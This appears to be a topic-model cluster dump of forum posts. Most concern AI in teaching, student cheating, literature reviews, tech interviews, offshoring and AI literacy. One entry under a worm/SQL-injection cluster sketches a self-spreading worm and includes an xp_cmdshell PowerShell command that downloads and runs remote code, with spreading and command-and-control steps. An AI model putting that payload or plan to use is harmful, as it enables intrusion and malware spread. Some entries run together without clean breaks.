Name: 176_ban_banning_internet_students use
Representative_Docs: ['trust me your students are already using ai the question is how are they using it as a study partner helping them understand material and deepen their analysis or as a copy editor helping polish their work and clean up citations if so why not support that i give my students clear guidance on responsible ai use it s here it s not going away and pretending otherwise is a disservice the goal isn t to ban the tech but to help students use it in ways that enhance not replace their learning like calculators or citation tools ai can boost efficiency without undermining the learning process if used wisely the key is teaching that difference it s not about fear of ai but about keeping education honest purposeful and relevant', 'i agree it s an opinion it s also geared towards me being against students using ai more than teachers i worked for two ai companies last winter trying to better understand the whole process i worked for weeks and then couldn t continue as i just didn t support the whole environment it was building it was eye opening how well the ai could deliver an in depth outcome even with a basic prompt and limited input in a few short years though i ve heard more and more students make side comments to each other about how they don t even need to do the work as ai does it for them if they used ai as a tool for an assignment and then put the energy into understanding the why then i would feel better they don t though and why would they they are kids and the path of least resistance is what they want we adults all have more critical thinking skills and can evaluate responses because of the way we learned i wouldn t be against ai in education if it had a place where students were forced to grow themselves academically but they often take the first output as fact and don t care to invest beyond that i have adapted the way i assess students and deliver content so that kids stay hands on and must formulate responses based on their own content i often have them write out their own work in class as leaving it for hw just results in shared answers and generated responses just my two cents still an opinion but with a little more grounding as to why', 'hey really great to hear someone else understands i also was very pro extension and had almost no one speak up in class are you sure we didn t teach different sections of Name: 181_literature_literature review_review_systematic
Representative_Docs: ['are there any good ai which can be used to gather literature for literature review', 'disclaimer this is strictly from a perspective of social science research as someone from a heavy quantitative but still social science field i struggle to see a reason for this sure writing a literature review is sometimes tedious yet imo it is absolutely necessary you might have a research question already in which case you probably know enough about the field to find a gap then by surveying further literature you can find an issue with your rq or an enhancement or a helpful framing in that case you are not really doing much repetitive work every idea might be helpful but you can t know which unless you go in depth ai even with an insanely good prompt couldn t help at that stage if it could i wouldn t trust it to then maybe you don t have a research question getting a broad overview of the topics has some value but who for if you are in a phd or at any point after it you already know at least the foundational literature you need specifics not summarizations if you are maybe beginning your phd or are in an earlier academic stage then this misses the point entirely you need to learn by doing to understand which parts of looking at the literature are needed which can be done faster how to read extract information relevant to your specific topic and write it up over time you get better and faster replacing that implies a researcher that does not engage with previous work critically this is also not a jab at ai in general for example another tool that has to do with literature reviews researchrabbit ai helps the workflow of doing a literature review without replacing it', 'fellow grad students if you re knee deep in your lit review and feeling like you re drowning in a sea of pdfs you re not alone as a phd candidate in psychology my dissertation lit review required synthesizing sources on cognitive behavioral therapy applications manually extracting themes noting biases and ensuring comprehensive coverage it was a recipe for burnout that s why i ve leaned into ai tools designed for academic texts and they ve cut my research time in half without sacrificing quality first off the key is choosing tools that go beyond basic summarization a good literature review generator doesn t just spit out bullet points it organizes sources thematically and suggests interconnections for example i inputted my core keywords into textero s literature review tool uploaded a few key pdfs and it generated a structured overview main arguments counterpoints and even methodological critiques it flagged how older studies on cbt evolved with modern neuro imaging data which became a pivotal section in my review this isn t just convenient it helps spot research gaps early like underexplored cultural adaptations in therapy pair that with a reference finder feature and you re golden for expanding your bibliography instead of endless database dives it scans for related citations and verifies their relevance in my workflow i d generate the initial review then use the finder to add more sources per theme the free tier handles smaller batches which is perfect for iterating during early drafts of course accuracy is paramount in academia i always cross check ai suggestions against originals tools can hallucinate but ones with built in citation verification minimize that an ai fixer came in handy too for paraphrasing dense excerpts without losing meaning it made my writing more concise while keeping the scholarly tone pros faster synthesis means more time for original analysis cons over reliance might dull critical thinking so i limit it to of the process for freelancers or lecturers prepping courses these could streamline prep work similarly how do you handle lit reviews has anyone tried ai for interdisciplinary topics drop tips or tools you ve found reliable let s build a resource list']

Name: 187_interview_team_round_technical
Representative_Docs: ['i have an interview coming up for a software platform support engineer dgx cloud position and wondering if anyone here has gone through an interview for a similar role at nvidia what should i expect i have a feeling that there probably won t be any leetcode questions asked but i could be wrong i found a few interview questions on glassdoor searching for technical support engineer interviews under nvidia but they seemed to be more hardware type questions related to building pcs and gaming technologies and not sure how relevant they would be for an interview for this particular role that s focused on dgx cloud no results came up when searching for software platform support engineer or dgx cloud i m reading up on dgx cloud and i m not sure if they re going to ask stuff like how to create an ai cluster and connect it to a workload or something similar or do a couple of tasks in the command line i got some potential interview questions from gpt when feeding the job description to it but they seemed too basic anyway i guess i will practice those as well if anyone is able to share their experience thanks in advance', 'for the technical interviews expect questions about ai ml algorithms model selection and implementation strategies they might present you with scenarios where you need to explain how you d approach building an ai system including data preprocessing model architecture and evaluation metrics the llm specific experience could involve discussing the latest developments in large language models their applications and potential challenges in deploying them at scale the case study will probably focus on a real world business problem that capital one might face such as fraud detection customer segmentation or personalized product recommendations they ll want to see how you approach the problem from data analysis to model selection and implementation planning for the behavioral interviews prepare examples of how you ve led ai projects resolved conflicts in technical teams and prioritized competing demands in your previous roles be ready to discuss your decision making process and how you ve handled challenges in ai ml projects if you re looking to sharpen your interview skills for this ai role you might want to check out this interview ai helper i m on the team that created it and it s designed to help with tricky interview questions like the ones you might face in your capital one power day', 'i ve been interviewing for a while now mostly out of curiosity i rarely send direct applications so it s all outreach the out reach for which i was unqualified ended quickly the others ended up to position or offer i am not decided to accept or not at this time i am doing this post because i see all of you focusing on coding and mainly on coding aspects that are irrelevant to the job a job is the software industry is much more than that here is some feedback for those who are curious i had no leetcode at any point i had a few home assignments which could be considered leetcode easy do not underestimate them an assignment should be treated as a full scale project that will go into production they could ask you to design a function that adds two numbers the point is not here focus on write your requirements and assumptions in a document make sure the project is usable out of the box if setup is required describe it if they ask you to develop in python make sure to package it using poetry uv or whatever you want but simply shipping the function is not acceptable write clear code respect conventions take care of the architecture think about the user be consistent in all aspects in documentation and in coding example don t separate somes lines by a some others by a and others by nothing chose one and stick to it document your code do not comment it write actual doxygen xml documentation or whatever is the standard for the target langage provide a unit test suite if you have time showcase your project by integrating it into github ci or equivalent oa are an occasion to showcase your work practices and general knowledge the problem itself is irrelevant don t focus on it too much sd interview had my first and only sd interview and passed your design is not important at all providing you are not proposing absurd solutions focus on communicating explore all possibilities even the obviously dumb ones but criticize them what s expected from an engineer is not someone who has an answer to everything but someone who can think is creative and is then capable of weeding out their ideas always clarify functional and non functional requirements you are in control make sure to select a sub set of functional requirements that works good for you and is easy to design mention the more complex requirements and just state you won t take them into account for instance if they ask you do design a messaging app focus on conversations emojis read recipes and files exchange you may want to discuss group messaging to show off don t mention it don t design it qps values are not important once again it s all about thought process the number themselves are irrelevant make sure to target realistic order of magnitude you do not design yt for users but maybe assuming m a day is enough even if we all know the real number are hundred of times higher ask for closed feedback regularly once again an engineer is not someone who has all answer by themselves but someone who can communicate listen to other and find team approved solutions keep things simple technical questions it is ok you do not know do not invent an answer and assert it like its true simply states well i do not know that but i guess we could do something like this what do you think about it how would you approach this you should never have absolute answer to anything unless its an academic question the objective of those questions is to understand how you think and how you are going to interact with the team you are already in a team you the interviewers form a work team an interview is a discussion not an exam even if its on the question answer format behavioral do not invent memorize dumb stories be them generated by chatgpt or else those questions are to understand how you behave on a human an in a team your answer should be clearly constructed show the value of your work and how you make impact drive a team direction don t trust the examples shown on rainforest lp star video this is pure bs no one ever walked into a project that was in shambled sit and draft and plan and magically the plan solved all the roadblocks and the company earned m just thanks to this man o this is pure bs and as an interviewer someone who answers to me in this way will not pass to the next round always place value in the team there s no self made man when you were faced with a challenge it s not just you but the entire team while you had individual actions that are important to highlight during those questions as an interviewer this is when we see if someone appropriates the success or if they understand the value the entire team brought you probably had project you lead alone use them in those rounds but always give credit to the team in other example use that to illustrate how you can drive team decisions it is ok to take examples where you failed failing is part of the game use that to show how you reflect what you learned and what you are now doing differently i know that some companies are trying to transform the interview process in a theatrics show but it s not what it is about it s about connecting and showing that you can interact with multiple people on multiple teams reflect on your ideas and understand the ones coming from others']

Representative_Docs: ['question nst battle ground time limit memory limit league background you are tasked with implementing a strategic turn based game where two branches of newton school of technology team sonipat and team pune engage in a healthy and intense competition to claim coding supremacy both teams bid for valuable tech resources over multiple rounds learning and adapting based on each other s previous strategies the aim is to outsmart the opponent while managing limited energy resources carefully rules of the game the match consists of r rounds between team sonipat and team pune in each round there are n different tech resources up for grabs mentorship hours cloud credits ai tokens debugging tools etc both teams are provided with e units of energy to distribute as their bids across these n resources the energy e may vary each round but remains the same for both teams bids are made simultaneously and secretly without knowledge of the opponent s current bidding strategic adaptation in the first round teams have no prior information and must bid blindly from round onwards before placing new bids each team is shown the entire bidding allocation of their opponent from the previous round teams can analyze this information to adapt and counter the opponent s strategies in future rounds scoring system per round for each resource if a team s bid is higher than their opponent s bid they win that resource and earn points if both teams place the same bid on a resource it is considered a draw and both teams earn point if a team s bid is lower they lose that resource and earn points after evaluating all n resources in a round if a team wins more resources than their opponent they are awarded an additional n bonus points if both teams win an equal number of resources they both receive n bonus points the team with fewer wins does not receive any bonus points objective the competition is designed to test strategic thinking resource management and adaptability over time your task is to develop a bidding strategy that maximizes your total points across all rounds leading your team to the top of the leaderboard after all matches are completed the representing team pune s previous bids on each resource then an integer k is given again representing the new energy units available for the next round if k at any point it signals the end of the game output for each round output an array of n integers representing your bids for each resource each bid must be and the sum of all bids must be k the available energy for that round note you must output Name: 212_worm_sql_sql injection_injection
Representative_Docs: ['as someone who loves to write their own sql queries having some tool produce a query for you when you re trying to accomplish some other task is a good use case yes it would be better if you knew what the sql query was doing i ve written sql queries for other people that they couldn t explain despite me formatting it and explaining it but they were just interested in something else offloading to an ai is little different than offloading it to me', 'hey guys i m not sure if this is the correct place to ask this i am a geospatial engineer i mistly work with python and a bit of sql when dealing with large amounts of data i have one year of expeience post grad from a physical geography degree i currently work for a company and was put on a project that required me to make a power app i ve got it working but after showing it to my boss he said that my table and architecture design is poor and i have a lot of tech debt i tasked to make a crud app for a client they had an excel rag form that they filled out every day assigning rag statuses explaining why the status and the how it will be mitigated however it was written over the following day with no historic log kept the requirements were client wanted to migrate from an excel form to a power app data entry form and a power bi to view the data they wanted to keep a historic log of final data alongside an audit log of whenever anyone made any change to the data a computer generated rag that would select rag colour based on the issue to be able to fill out the form for the current date days ahead to be able to filter the form by topic and who will be filling out the form here is where my inexperience with power apps really shows the excel rag form had set topics and topic groups that would not change they would always stay as what they were in the excel originally i wanted to create a sql table with all the form topics and another table that would record any changes made join them in a view and edit data this way however i ran into a lot of problems with this the app was very buggy and slow so i came up with the idea of just creating an sql query that would bulk insert the forms into one table separating each new form by date my logic behind this was that in the app the user would be able to filter the sql data in the gallery by a date filter drop down this would also improve performance as the entire sql table would never be loaded into the power app at one point as it will always be filtered by the date i also created a keyid column that would assign an integer to each topic i e topic will always be keyid value etc i believe this is my first mistake i am very new to power apps and sql this was my first time using power apps and sql in this way and at the time believed that this was the best way to do it once the user submitted any updates made i then had a patch function that would on completion add the changes to my audit table alongside who made the changes and at what time frustratingly through the project the client kept on adding to the scope they wanted the ability to compare a rows most recent information with the previous dates and to have a column that would determine whether it had changed or not at this point i thought the way that i had set up my tables was the best method as now i could create an sql procedure using the datekey and keyid to compare rows and update a new change column i added i added this to a power flow that would run on the success of a form being submitted the client then wanted the ability to assign a user rag as well as the computer rag just in case the user felt like the computer generated rag was incorrect and then have another stored procedure that would always use the users input rag over the computer generated rag this stored procedure would fill this value into a final column called finalrag in conclusion i think scope creep effected my architecture greatly but also my inexperience with this kind of work do you guys have any advice for me or have any ways that you would have tackled this project differently thanks', 'conceptual design the self improving defensive worm via sql injection objective to plant a worm using sql injection this worm will then spread defend infected systems against other threats attempt to improve its defensive capabilities and report its activities phase initial infection via sql injection the first step is to get the worm onto a web server using an sql injection vulnerability identify a vulnerable target find a web application with an sql injection flaw that allows writing files to the server or executing commands craft the sql injection payload the payload s goal is to make the server download and execute the initial worm loader conceptual sql injection snippet varies greatly by sql type and vulnerability sql example for mssql with xp cmdshell highly simplified assumes a vulnerable parameter input param exec xp cmdshell powershell c iex new object net webclient downloadstring this conceptual payload attempts to use xp cmdshell if enabled and permissions allow to download and execute a powershell based worm loader from a server you control real world sql injection is far more nuanced and depends on the specific database and vulnerability worm loader this initial small script worm loader ps in the example would be responsible for downloading the full worm package executing the worm with appropriate permissions establishing initial stealth and persistence phase worm core functionality once active on the initial server the worm begins its primary functions self replication and spreading this is key for a worm network scanning scan the local network and the internet for other vulnerable web servers sqli known exploits to replicate the initial infection method exploiting system vulnerabilities carry a payload of exploits for common os and software vulnerabilities to infect client pcs connected to compromised networks email propagation access email clients servers on infected machines send emails with infected attachments or links to itself disguised as legitimate files to contacts usb drives if on a client pc copy itself to connected usb drives with an autorun mechanism if still feasible on modern os file sharing p p spread through shared folders or p p networks defensive actions the ethical aspect vulnerability patching identify known vulnerabilities on the infected host e g outdated software and attempt to automatically apply patches or change configurations to secure them this is a core idea of ethical worms malware detection and removal maintain a database of signatures behaviors of known malicious malware scan the system for these threats and attempt to neutralize or remove them intrusion detection monitor network traffic and system logs for signs of new attacks attempting to block them reporting mechanism periodically send encrypted data back to your command and control c c server data to send number of new infections and their general location ip if possible number and types of attacks successfully defended against on each host new vulnerabilities discovered patched status of the worm on each host phase self improvement mechanism highly theoretical this is the most complex part bordering on ai driven malware learning from encounters when the worm encounters a new unknown type of attack or malware it couldn t defend against it would log detailed information about the attacker s methods payload and system impact this data would be sent back to your c c server centralized analysis and update generation on your c c server you would or an ai system you design would analyze these reports of failed defenses or new threat types develop new defensive rules signatures or behavioral detection algorithms compile these into an update package for the worm distributed updates the worm instances would periodically check in with the c c server for new updates download and apply these updates to their own codebase and rule sets this allows the entire network of infected machines to improve their defenses based on experiences from any single infected node this is akin to how modern antivirus software receives updates but the worm would be updating its own core logic and defensive strategies ethical and practical considerations immense complexity building such a system especially the self improving ai aspect is an enormous software engineering and ai research challenge unintended consequences a self propagating worm even with ethical intentions can easily cause massive network disruption consume vast resources or have bugs that damage systems the line for ethical worms is very thin legality unauthorized access and deployment of any software regardless of intent is illegal in almost all jurisdictions detection such aggressive behavior and network communication would likely trigger advanced security systems and edr solutions this conceptual framework outlines how one might approach designing such a sophisticated piece of software the self improving aspect via distributed learning is particularly challenging but represents the theoretical frontier of such a worm']

Name: 213_cheating instead_cheating_guess_students use
Representative_Docs: ['i m a hs teacher first my students use ai to cheat primarily to write essays but also scan multiple choice tests to get the correct answer ai can also do this with short response normally i can catch it the ai answers have no grammar mistakes too authoritative scholastic to be written by students but using it defeats the purpose of the exercise and doesn t show me if they learned only that they know how to cheat second ai robs students of their creativity i m a history teacher i like to use games to teach i ve caught students using it to ask for advice to make the best moves when they play diplomacy which i use to teach world war i i ve also seen them use it to come up with ideas for political cartoons rather than think up their own i m not against ai but i don t want it thinking for my students', 'i don t know it your metaphor but to me this suggests ai cannot just be outlawed and not all of its uses can be considered cheating instead ai will be at the very least an central tool in the future so it s part of our duty as teachers to form people who are able to correctly incorporate it in their routine i understand the dangers ai makes it difficult for its users to familiarize with the ropes of a discipline writing programming etc because it offers a shortcut from day while the best ai users the ones gaining the most from it are the experts in that discipline how to become experts without being good novices first but we must find way to adapt teaching to the ai era for example maybe students should be encouraged to first try to write alone on their own then compare with what ai suggests and finally judge which differences are improvements so to learn from it and which if any are losing something valuable of the human response then see which prompt fixes it or i dunno i don t have final answers just saying that the answer cannot be to invert the arrow of time and try hard to make it like the course happened before ai if won t work and if it did it would be a terrible service', 'yes some people always want to try to game the system but i have seen a noticeable drop in ai usage with this method i am not the only professor at my college who does it and same results i do not think its a magic pill of any kind but i imagine the fact that i am even openly acknowledging ai makes it clear to the students its something i am knowledge on and am actively looking for letting them know the correct way to use it in my opinion everyone class is going to be different gives them a path that i have approved and therefore are more likely to stay on i absolutely keep our agreement as you stated someone still tries there is always or i catch them i let them know i give them zero s on their assignments i always let them know there is a lot of class left and one won t kill them but that i am not extra looking at them even if i am not and just maintaining what i did before the fact of the matter is ai is here it will not be going anywhere more and more businesses schools and so on are having war room sessions to figure out the best way to implement so they don t fall behind other places i worked in tech and have for about years i have helped implement ai at organizations i have worked at and to deny our students a least a cursory understanding and experience with ai is doing them an injustice in my opinion i am not an ai salesman i have worked just fine creating my own ideas and leading teams i have been a manager director for years but i also know when new tools come out you should take the time to learn how they can help you because other people definitely will be their contemporaries will be using it to generate ideas and do easy edits so why shouldn t they my wife also teaches undergrads and her university is exactly thinking the same thing how can we best allow students to use this in a way that isn t cheating because they will and to pretend they won t is just hurting them and us']

Name: 215_mistakes_gpthuman_writing style_spelling
Representative_Docs: ['being mistaken for ai due to your writing style is a tough spot to be in since you mentioned your neurodivergence and language challenges it might help to be upfront with your professors or academic advisors about your situation you could explain that your writing style is a reflection of your unique perspective not a product of ai if you have the opportunity consider reaching out to your institution s disability services they might offer resources or guidance tailored to students in similar situations it s also a good idea to document any conversations you have about this issue just in case you need to reference them later as for improving the human touch in your writing try incorporating more personal experiences or reflections into your work this can help differentiate your voice from ai generated text have you thought about sharing your experiences or challenges in your writing that could really add a unique touch and showcase your individuality additionally tools like aidetectplus or gptzero can help you analyze your writing for ai like patterns allowing you to refine it further and ensure it reflects your authentic voice', 'when i used to edit my school essays discussion boards or any work that required any form of writing on my part i always made sure they were professionally written and clean w no grammatical or punctuation errors now w ai on the rise i ve had to edit all my work and add grammar and punctuation mistakes to my writing bc i can t undone the years of english i ve had to take i had one professor accuse me of using ai and cheating bc of how clean and polished my essay was so ever since then i ve made sure to always add mistakes and keep my writing chiller like an th grader wrote it bc that s the only work professors are excepting now apparently i hate the ai detectors they use bc i still get flagged for ai when i m writing professionally for a professional assignment it s unbelievable', 'i would depend upon how you used it and factors specific to you if you asked it to look for flaws and explain them and then took that information to make the fixes yourself there are two points in your favor one you made the fix yourself two you are doing so in a way that is teaching you what you did wrong if you instead stuck it in and it did the fixes which you then copied you would be using its work without crediting it which is generally considered unacceptable i say generally because letting a spell checker correct the spelling of a word is generally accepted even though i ve read some research it harms ones ability to improve their spelling that said you are also likely working under some honor policy of the college or similar in the class syllabus which might put you under stricter requirements such as not using ai at all i still see some edge cases like google docs or word doing some simple grammar checks by default and i m not sure how educators should handle those i would almost ask that the student version of such products should come with those features disabled but that isn t a realistic possibility in most cases i would suggest against it enough professors will have strong anti ai policies limiting it anyways to make it worth avoiding in general and even for those who don t students are unlikely to keep their usage within acceptable bounds']

Name: 216_ge_workers_companies_offshoring
Representative_Docs: ['i d like to try to be a bit optimistic and believe that a lot of this is a slump due to factors beyond ai things like higher interest rates a shaky economy and so much uncertainty making companies sit on their hands and wait to see if things turn around a bit before they start putting money into new developments also throw in there the overhiring they did during the pandemic and thus shareholders screaming for more money so cutting staff is the answer for them my only big concern about all these companies that are trying to get rid of junior level workers and instead having senior level workers just use ai to save time what happens when those seniors want to get out of being a senior and maybe get into more management what happens if they decide they want to get out of technology completely and try a different career what happens if they start their own companies and leave now suddenly you re going to have companies wanting senior level workers to fill those seats and yet they re going to complain that they can t find anybody because there haven t been any juniors around for a while to work their way up into that senior level having junior level workers isn t some kind of charity thing it s also about trying to build and nurture talent to be your key player tomorrow if companies want to complain their juniors keep jumping ship then maybe they need to examine what they compensate these people with you can t be all supportive of capitalism and then at the same time complain about it when it doesn t favor you because your competitor is offering that junior way more money and a promotion when you didn t i will also throw out there that if you re going to give ridiculous compensation levels to executives and then complain you can t find quality workers at the lower levels because you won t pay them decently then that s on you a lot of this really comes off to me as very short term thinking they want to get to next quarter or next year and have good numbers so they can keep their own jobs and keep the shareholders happy i keep wondering if there s going to be a bubble burst at some point when reality slides in and i m not anti ai i use github copilot to help me in some matters but i will say that it doesn t always deliver the ideal result i ve had software engineers look at the code generated and find holes in it or a lot of bloat makes me wonder if we re going to see some companies embrace vibe coding despite whatever security and performance risks that come with it just because they want to cut some salaries', 'i believe the real reason for the job market especially tech being what it is crap isn t really the economy or overhiring or any of that it s a quiet calculated stall i believe executives are deliberately waiting on the sidelines paralyzed by indecision due to ai and it s creating a deadlock in the job market here is the thing about ai it s both blessing and a curse for overseas workers on the one hand it s a curse as it can do all the grunt work all the boring mundane stuff that workers from the west wouldn t want to do for minimum wage now it can do all that in seconds taking away all those jobs in no time junior developers are in real trouble for example everywhere actually but it s also a blessing since a lot of the language and cultural barriers that have held back a lot of the offshoring work are now cleared because of ai it helps foreign teams write perfect documentation communicate flawlessly and understand cultural nuances this makes offshoring high level work easier and cheaper than ever before so what that means is more work can now go offshore as they can build better stuff so where does that leave the west and our tech workers probably not in a very good place the questions c suite folks are asking are are we really going to need devs a year from now when we can already get a boost in efficiency using ai to do the coding and in six months that s probably going to be or are we really going to have that many more projects to keep everyone busy the problem is managers were taught to do their forecast based on trends and what they know about the current state and with how fast ai is improving that s really hard nobody knows what it s going to be capable of doing in months you can already vibe code full applications so in months it might be able run the company s whole codebase and make changes to it put in some extra features etc so then you may need out of those people but how do you plan for that it may or may not happen entirely possible that ai will disappoint and won t be able to do any of that as it hallucinates and the code it produces is just too flimsy so the only thing they can do is stall which is what i think is happening for the most part they ve been stalling for the past year or so the margin of error is now so massive that any long term hiring plan is pure fantasy committing to a huge headcount is a massive risk but not hiring means falling behind so they stall they wait they extend hiring freezes do small scale layoffs to trim fat and push productivity tools on existing teams all while waiting for the fog around ai to clear we re not in a crash we re in the great stall and i think it s been happening for the past year so what do you guys think are you were you seeing any of this just kicking the can down the road stuff', 'and as far as i know it hasn t replaced any software engineering jobs yet i think it depends on how you want to look at it let me give an example that has nothing to do with cs general electric makes washing machines in the united states their manufacturing plant used to have a motor building division that machined and wound the electric motors driving the washers operations about years ago ge decided that it no longer wanted to make its own motors and it started purchasing them from a company in china the people who built the motors were laid off and the division was shut down did ge offshore those jobs to china ge will tell you that it did not because offshoring implies that ge took a job in the us and created a new equal job in china for lower pay ge will tell you that they re simply no longer in the motor making business and that they just buy those components from a vendor now but that doesn t change the fact that there used to be american workers winding ge motors who are now jobless and that there are workers in china doing that winding for ge today same paradigm exists with ai no company is going to look at an existing position and say we re going to fire bob and replace him with ai instead ai will be brought on to speed up the development process and make things more efficient all of the developers will adopt ai as a coding assistant and after that we re no longer in the pojo writing business we re no longer in the test writing business we re no longer in the sql writing business and then down the road a few more years when budget cuts come along the bosses will say hey we re so efficient now that we can reduce staffing without losing any substantial amount of productivity and so bob gets laid off his position was not replaced by ai his work was not replaced by ai there is no to replacement of bob s job with an ai agent but the efficiency gains that ai provided made him unnecessary bob is still unemployed and ai was the cause of his unemployment that shift is already happening at a non trivial scale it s not going away but it s impossible to predict how far it will expand because we don t yet know what the limits of these systems will be anyone claiming otherwise is trying to sell you something is in denial or isn t paying attention the simple truth is nobody knows what the industry is going to look like in or years nobody']

Name: 217_tickets_knowing things_ambiguous_requirements
Representative_Docs: ['tickets are on a spectrum from clear to ambiguous clear tickets for which there is an obvious fix can probably be automated by ai for ambiguous tasks for which there is no clear solution i m not sure ai would work as a senior engineer most of my work is too ambiguous for ai so maybe we would need fewer engineers in the future but i don t think software engineers are going to go extinct as a profession', 'i ve gotten to the point where i give people bad performance reviews if they re anti ai coding is not for fun it is to benefit the company your options if you don t like it are to leave the company you need to be providing advanced value and taking smart leaps ahead not talking about nerd shit i have the policy that ai needs to be given a chance to write all non critical documents people should not be writing they should be encoding value through ai and then decoding it using ai summary doing the minimal amount possible so you can focus on face to face communication with customers you re going to be expected to do more because ai will be helping you one person can now do the job of yes it is the future much like most previous industrial revolutions', 'some exec somewhere in the company decided everyone needs to be talking to ai and they track how often you re talking with it to me this just feels like idiotic executives if it weren t ai it would be back to office or lines of code produced etc ai is just another way for a dumb exec to be dumb what happened to actually knowing things when will people realize ai is frequently confidently wrong i use ai and i think i know things i think knowing things is critical in fact i d say my job is now much more about knowing things and a lot less about typing things i need to know the domain the shape of the problem the ux the algorithms that solve it where things can go wrong etc the ai is basically just really fast at making changes across n files which is something that i find harder to do i also personally use ai primarily for writing tests based on the spec i ve given i typically write a few myself and then ask it to continue that forward which i then review i don t think ai is that frequently wrong but to some degree it s a matter of prompting context and experience it definitely is right of the time i ve even had it point out when i m wrong which is super helpful oftentimes the ai can have context that i don t because we create global rules across teams as we learn new lessons over time i feel like an insane person shouting on every company survey and in every town hall meeting to get these ai pilled people to understand the damage they are doing well if you re actually shouting at people at every company survey then yes that is quite odd what have you actually tried you re saying people are adding a lot of defects that s surprising i wonder if maybe you would be better served by helping people to see this using concrete examples acknowledging that people want to use these tools finding safer ways for them to do this helping them know where ai can be helpful and where it s harmful perhaps creating more rules and context for the ai would be helpful in short i would suggest starting with the assumption that there is value in ai because your teammates seem to feel that there is value rather than asserting that they are wrong try taking on their position and then finding out how to maximize the benefits happy to discuss further i understand that you re in a frustrating position it s certainly crazy to hear that your execs are measuring and reprimanding based on ai usage but maybe i can lend some perspective from someone who s more in the middle']

Name: 220_faculty_senate_think faculty_op
Representative_Docs: ['yes i agree it seems op said that they are president of faculty senate and clarified they heard about this from another colleague i do think faculty governance can play an important role in setting out general policies about ai use by students and faculty and perhaps even direct departments to come up with their own discipline specific policies however i absolutely don t think a faculty member should be using ai to basically do their job and if there is currently no guideance or policy then op is going down the right path', 'i can think of a number of ways a report about this might have escalated to the faculty senate i can t see any reason for thinking the op is incorrect other than assuming this is one of the innumerable anon fake prof accounts that like to post in this subreddit about ai but almost all of those are shilling for ai in some way or they re trying to find out what strategies faculty use to detect ai usage i think making exceptions with regard to a professional practice like this one is quite literally an act of collective suicide for any faculty at any institution it s like saying we ll make it optional whether you have to turn in your grades or not or if you decide it s best to just tell students to watch ken burns civil war you don t have to show up in person or on zoom to teach your class on american history it s your choice we re not talking here about allowing controlled or specified ai use by students or using ai in completing some aspect of your own research like generating code we re talking saying it s ok for ai to do a core function of your job as a trained professional the moment we say that we re saying you don t need faculty any more you just need a couple of ai minders you can fire the rest of us right now', 'so our faculty senate put forward a broad policy for the entire faculty body to operate as the broad boundaries to the playing field for generative ai usage the four major points are artificial intelligence should not take on the role of the instructor as the ultimate authority or primary source of information and knowledge and ai should not replace the instructor as the final arbiter of a student s academic abilities and in general ai should not be used to replace the academic skills and or processes required to know understand and demonstrate the material methods techniques and or practices of the course whether that be in the workforce or in an academic area and in general neither ai nor other electronic tools should supplant the necessary memorization of facts algorithms and methods processes essential to knowing and understanding the material of the course it is broad enough and vague enough to give guidance to faculty professionals to manage the situation in their own fashion it should also allow them to defend themselves against accusations if they choose to fail students for ai usage which is not always easy to do at our student centered college there are now some faculty asking for us to include an app in canvas that promises to grade students work and provide feedback using ai i think this is definitely outside the bounds of what was proposed i also think it is terribly dishonest and unprofessional it is bad enough when students use ai to avoid thinking and get dumber because of it but when your colleagues are the ones sapping our entire ivory tower then what can we do it is damned frustrating and the last time i posted here about anything ai and teaching related there was a bit of a pile on from would be student advocates i suspect they were grad students but perhaps the most frustrating part of this is that generative ai is so obviously stupid and will probably be the siri of this benighted generation obsessed with baubles and shiny new things i hope this ends soon and the new shiny thing isn t as idiotic']

Name: 221_literacy_ai literacy_ai fluency_fluency
Representative_Docs: ['i view it as a subset of information and data literacy and i focus hard on developing information literacy among my students who often don t even understand that they can in fact question what they read it s the fact that students especially those fresh out of high school have little to no ability to think critically i use question based discussion boards where students have to come up with their own questions based on assigned material and i ve had students legit thank me because that was the first time i realized i was allowed to question what i read i think once i realized how many students are coming into college without basic critical analysis skills i started to understand why so many have turned to ai and use it without even bothering to fact check the output for anyone who has information data literacy ai literacy comes naturally because it s a tool of information and data not always correct data or information it s the lack of critical information literacy that is the real issue the ethics of ai use is an entirely different matter because i don t think students realize that when they feed assignment prompts into ai they are technically using professorial material without consent and therefore violating both intellectual property rights and privacy laws if they could be enforced which is pretty difficult considering the burden of proof not to mention environmental impact which most students really don t know also i wish these people promoting ai literacy would say that what they really mean is llm literacy because ai existed way before llms the adaptive algorithms on social media streaming services retail websites etc are all ai they just aren t llm ai so the irony to me is also that these are people promoting ai literacy while fundamentally lacking it themselves', 'literacy used in this way is at least two removes from what literacy literally once meant literacy how to read information literacy how to navigate information research and resources ai literacy how to use an ai tool information literacy has some coherency since doing research and reading are closely tied together and there are a lot of not obvious cognitive skills we use when evaluating information its credibility and how we might use it but ai literacy feels like branding it s a tool what we tend to learn in ai literacy seminars is how to use the tool or at most how to think about the output it gives us but we aren t becoming more literate by learning that we aren t practicing a more profound cognitive faculty it doesn t feel like a literacy in the way information literacy or quantitative literacy works in short it s a way to hype using ai and to make its use sound more rigorous than it is', 'ai fluency is something i ve just immersed myself in in the past week and i m wondering if others have explored it conceptually used it in their work with ai used it in teaching and what their experience has been in adapting it so far it seems to be gaining rapid adoption in some circles and i imagine my feeling that it just sprouted overnight is due to it being embaced and shared by some very influential people in ethical ai research i found it through anthropic s share out of findings on faculty use of ai through their clio research using ai fluency modality terminology in a way i found very impactful and in exploring where this vocabularly came from i realized anthropic had built out an introductory course structure for understanding ai fluency for education anthropic is the company that deploys the social ai model claude for those unfamiliar anthropic since the beginning has placed ethical ai at the center of their discourse and have written a lot on their methodology and actively collaborated with academics and research groups on the topic ai fluency as a concept isn t theirs it was developed by a writing professor and a information systems professor richard dakan and joseph feller who it sounds like have been experimenting on using ai in the classroom at their respective institutions i m going to summarize it and give my thoughts below but for those who already have a background with it i didn t attend the usual industry events this year but based on the content and the rapid development in the tech sphere if this isn t already becoming the edtech instructional design conceptual framework for ai it seems likely it will be by next conference season so i am trying to get a faculty temperature check on the concept if anyone has used it to create a language around appropriate ethical ai usage in research if there are any inspiring resources they have found around it as a usable strategy what is ai fluency the living documentation for ai fluency is available here framework for ai fluency artificial intelligence at ringling libguides at ringling college of art design the framework for ai fluency describes the interconnected competencies needed to use ai in creative innovative and problem solving work rather than viewing ai merely as an efficiency engine the framework recognizes the potential for ai to act as an authentic thinking partner for doing meaningful cognitive work while acknowledging that this potential can only be realized through the development and performance of specific human competencies we define ai fluency as the ability to work effectively efficiently ethically and safely within emerging modalities of human ai interaction the structural elements of ai fluency are three currently modalities automation augmentation agency leveraged against four competencies delegation description discernment diligence the framework further provides three sub categories to further clarify each of the competencies creating the start of a rubric anthropic s discussion of educator use of ai used the modality terminology from ai 